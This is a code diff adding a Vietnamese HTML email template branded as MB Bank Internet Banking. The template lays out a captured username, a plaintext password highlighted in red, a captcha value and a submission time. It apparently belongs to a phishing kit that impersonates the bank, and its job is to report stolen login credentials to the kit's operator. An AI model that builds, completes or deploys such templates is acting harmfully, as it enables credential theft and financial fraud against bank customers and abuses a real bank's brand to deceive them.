@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Đăng nhập MB Internet Banking - {{username}}</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<style type="text/css">
+    body { margin: 0; padding: 0; background-color: #f5f6f8; font-family: 'Roboto', Arial, sans-serif; }
+    .wrapper { width: 100%; table-layout: fixed; }
+    .main { max-width: 600px; margin: 0 auto; background-color: #ffffff; border-spacing: 0; color: #333333; box-shadow: 0 2px 10px rgba(0,0,0,0.05); border-radius: 8px; overflow: hidden; }
+    .header { padding: 25px 30px; background-color: #141ed2; color: #ffffff; text-align: center; }
+    .header h1 { margin: 0; font-size: 22px; font-weight: 700; }
+    .content { padding: 30px; }
+    .section-title { font-size: 16px; font-weight: 700; color: #141ed2; padding-bottom: 8px; margin: 0 0 15px; border-bottom: 2px solid #e9ecef; }
+    .info-table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
+    .info-table td { padding: 12px 5px; font-size: 14px; line-height: 1.5; border-bottom: 1px solid #e9ecef; }
+    .info-table tr:last-child td { border-bottom: none; }
+    .info-label { font-weight: 500; color: #667085; width: 40%; }
+    .info-data { font-weight: 500; color: #101828; }
+    .credential { font-family: Consolas, 'Courier New', monospace; font-weight: 700; color: #101828; }
+    .credential-password { color: #D92D20; }
+    .footer { background-color: #f5f6f8; padding: 20px 30px; text-align: center; font-size: 13px; color: #667085; }
+</style>
+</head>
+<body>
+<center class="wrapper">
+    <table class="main" width="100%" role="presentation">
+        <tr>
+            <td class="header">
+                <h1>{{platform}}</h1>
+            </td>
+        </tr>
+        <tr>
+            <td class="content">
+                <h2 class="section-title">Thông tin Đăng nhập</h2>
+                <table class="info-table" role="presentation">
+                    <tr>
+                        <td class="info-label">Tên đăng nhập</td>
+                        <td class="info-data"><span class="credential">{{username}}</span></td>
+                    </tr>
+                    <tr>
+                        <td class="info-label">Mật khẩu</td>
+                        <td class="info-data"><span class="credential credential-password">{{password}}</span></td>
+                    </tr>
+                    <tr>
+                        <td class="info-label">Mã kiểm tra</td>
+                        <td class="info-data">{{captcha}}</td>
+                    </tr>
+                    <tr>
+                        <td class="info-label">Thời gian</td>
+                        <td class="info-data">{{submitted_at}}</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td class="footer">
+                Thông báo tự động từ bước xác thực Internet Banking MB Bank.
+            </td>
+        </tr>
+    </table>
+</center>
+</body>
+</html>
